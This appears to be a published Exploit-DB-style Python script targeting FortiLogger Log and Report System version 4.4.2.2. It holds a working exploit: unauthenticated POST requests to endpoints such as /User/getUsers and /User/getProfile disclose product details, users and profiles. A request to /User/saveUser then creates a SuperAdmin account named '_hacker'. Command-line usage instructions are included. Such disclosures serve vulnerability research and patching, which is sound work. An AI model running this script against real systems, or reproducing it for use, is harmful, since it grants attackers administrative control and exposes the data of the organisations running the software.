# Exploit Title: FortiLogger | Log and Report System - Remote SuperAdmin Account Creation Vulnerability / Information Disclosure
# Date: 30-01-2021
# Exploit Author: Berkan Er
# Vendor Homepage: https://www.fortilogger.com/
# Version: 4.4.2.2
# Tested on: Windows 10 Enterprise
# A remote attacker can be create an user with SuperAdmin profile

#!/usr/bin/python3

import argparse
import string
import sys
from random import random

import requests
import json

banner = '''
FortiLogger | Log and Report System - v4.4.2.2
Remote SuperAdmin Account Creation Vulnerability / Information Disclosure

Berkan Er <b3rsec@protonmail.com>
@erberkan
'''

commonHeaders = {
    'Content-type': 'application/json',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest'
}



def getProductInfo(host, port, flag):
    response = requests.post('http://' + host + ':' + port + '/shared/GetProductInfo', data={}, headers=commonHeaders)

    print("[*] Status code: ", response.status_code)
    print("[*] Product Version: ", response.json()['Version'])
    info_json = json.dumps(response.json(), indent=2)

    response_1 = requests.post('http://' + host + ':' + port + '/User/getUsers', data={}, headers=commonHeaders)
    user_json = json.dumps(response_1.json(), indent=2)

    profiles_payload = '''{
        'id':'all'
        }'''

    response_2 = requests.post('http://' + host + ':' + port + '/User/getProfile', data=profiles_payload, headers=commonHeaders)
    profiles_json = json.dumps(response_2.json(), indent=2)

    if flag:
        print("\n*** Product Infos=\n" + info_json)
        print("\n*** Profiles=\n" + profiles_json)
        print("\n*** Users=\n" + user_json)
        
    if response.json()['Version'] == '4.4.2.2':
        print("[+] It seems vulnerable !")
        return True
    else:
        print("[!] It doesn't vulnerable !")
        return False


def createSuperAdmin(host, port):

    payload = '''{
        '_profilename':'superadmin_profile', 
        '_username': '_hacker', 
        '_password': '_hacker', 
        '_fullname':'', 
        '_email':''
        }'''

    response = requests.post('http://' + host + ':' + port + '/User/saveUser', data=payload, headers=commonHeaders)
    print("[*] STAUTS CODE:", response.status_code)
    print("[!] User has been created ! \nUsername: _hacker\nPassword: _hacker")

    response_1 = requests.post('http://' + host + ':' + port + '/User/getUsers', data={}, headers=commonHeaders)
    json_formatted_str = json.dumps(response_1.json(), indent=2)
    print("\n*** Users=\n" + json_formatted_str)


def main():
    print(banner)
    
    try:
        host = sys.argv[1]
        port = sys.argv[2]
        action = sys.argv[3]

        if action == 'TRUE':
            if getProductInfo(host, port, False):
                createSuperAdmin(host, port)
        else:
            getProductInfo(host, port, True)

        print("KTHNXBYE!")

    except:
        print("Usage:\npython3 fortilogger_vuln.py < IP > < PORT > < CREATE USER {TRUE / FALSE} >\n\nIP:\tIP "
              "Address of FortiLogger host\nPORT:\tPort number of FortiLogger host\nTRUE:\tCreate User\nFALSE:\tShow Product "
              "Infos")
        print("\nExample: python3 fortilogger_vuln.py 192.168.1.10 5000 TRUE\n")


if __name__ == "__main__":
    main()
